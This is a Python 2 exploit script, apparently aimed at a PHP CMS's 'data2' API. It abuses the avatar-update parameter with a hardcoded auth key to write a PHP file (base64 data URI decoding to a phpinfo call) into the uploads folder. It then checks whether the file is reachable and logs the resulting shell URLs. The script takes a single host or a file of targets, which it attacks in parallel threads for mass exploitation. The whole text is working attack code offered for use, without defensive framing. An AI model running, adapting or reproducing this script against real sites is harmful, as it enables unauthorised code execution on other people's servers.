#coding:utf-8
'''
仿照了前辈的一些模式，有什么可以改进欢迎跟我交流
'''
import sys
import requests
import threading
def exploit(target):
    if sys.argv[1]== "-f":
        target=target[0]
    payload = "/index.php?c=api&m=data2&auth=50ce0d2401ce4802751739552c8e4467&param=update_avatar&file=data:image/php;base64,RjBybWF0PD9waHAgcGhwaW5mbygpOz8+"
    url = target+payload
    shell = target+'/uploadfile/member/0/0x0.php'
    try:
        requests.get(url, timeout=3)
        verify = requests.get(shell, timeout=3)
        if verify.status_code == 200:
            print 'Write success,shell url:',shell
            with open("success.txt","a+") as f:
                f.write(shell+"\n")
        else:
            print 'Oh!Sorry,Write failure!'
    except Exception, e:
        print e
def main():
    if len(sys.argv)<3:
        print 'python data2_getshell.py -h target/-f target-file'
    else:
        if sys.argv[1] == "-h":
            exploit(sys.argv[2])
        elif sys.argv[1] == "-f":
            with open(sys.argv[2], "r") as f:
                b = f.readlines()
                for i in xrange(len(b)):
                    if not b[i] == "\n":
                        threading.Thread(target=exploit, args=(b[i].split(),)).start()



if __name__ == '__main__':
    main()
